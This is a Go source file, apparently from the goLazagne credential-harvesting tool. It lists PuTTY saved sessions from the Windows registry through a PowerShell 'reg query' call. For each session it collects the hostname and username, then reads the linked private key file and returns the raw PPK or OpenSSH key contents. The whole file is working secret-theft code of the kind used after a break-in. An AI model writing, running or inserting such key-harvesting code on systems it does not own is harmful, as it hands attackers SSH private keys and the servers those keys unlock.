package sysadmin

//TODO
//extract ports as well
//HKCU/Software/*Sessions/#SESSNAME#/PortNumber (it's in hex)
import (
	"github.com/kerbyj/goLazagne/common"
	"github.com/kerbyj/goLazagne/types"
	"golang.org/x/sys/windows/registry"
	"log"
	"strings"
)

func hostNameExtractor(k registry.Key) string {
	hostName, _, err := k.GetStringValue("HostName")
	if err != nil {
		log.Println("Error extracting hostname: ", err)
	}
	return hostName
}

func userNameExtractor(k registry.Key) string {
	userName, _, err := k.GetStringValue("UserName")
	//we can work w/o username
	if err != nil {
		log.Println("Error extracting username: ", err)
	}
	return userName
}

func keyExtractor(k registry.Key) string {
	privKeyPath, _, err := k.GetStringValue("PublicKeyFile")
	if err != nil {
		log.Println("Error extracting private key location: ", err)
		return ""
	}
	key := common.ReadKey(privKeyPath)
	if key != nil && (common.PpkKeyCheck(key) || common.OpensshKeyCheck(key)) {
		return string(key)
	} else {
		return ""
	}
}

//extracts user, key, hostname
func puttyInfo(pathToSession string) (string, string, string) {
	k, err := registry.OpenKey(registry.CURRENT_USER,
		pathToSession, registry.QUERY_VALUE)
	if err != nil {
		log.Println("Error opening registry: ", err)
		return "", "", ""
	}
	hostName := hostNameExtractor(k)
	userName := userNameExtractor(k)
	key := keyExtractor(k)
	return hostName, userName, key
}

//extract Putty's username, hostname & key location from registry
func puttyExtractor() []types.PuttyData {
	var keys []types.PuttyData
	//get the sessions hives' names
	sessions := common.ExecCommand("cmd",
		[]string{"powershell", "reg", "query", "HKCU\\Software\\SimonTatham\\Putty\\Sessions"})

	if len(sessions) <= 0 {
		return keys
	}
	sessionList := strings.Split(string(sessions), "\r\n")

	sessionList = sessionList[1 : len(sessionList)-1]

	for _, session := range sessionList {
		session = session[18:]
		hostName, userName, key := puttyInfo(session)
		if key != "" {
			temp := types.PuttyData{HostName: hostName, UserName: userName, Key: key}
			keys = append(keys, temp)
		}
	}

	return keys

}

// Add normal error reporting

func PuttyExtractDataRun() ([]types.PuttyData, error) {
	info := puttyExtractor()
	return info, nil
}
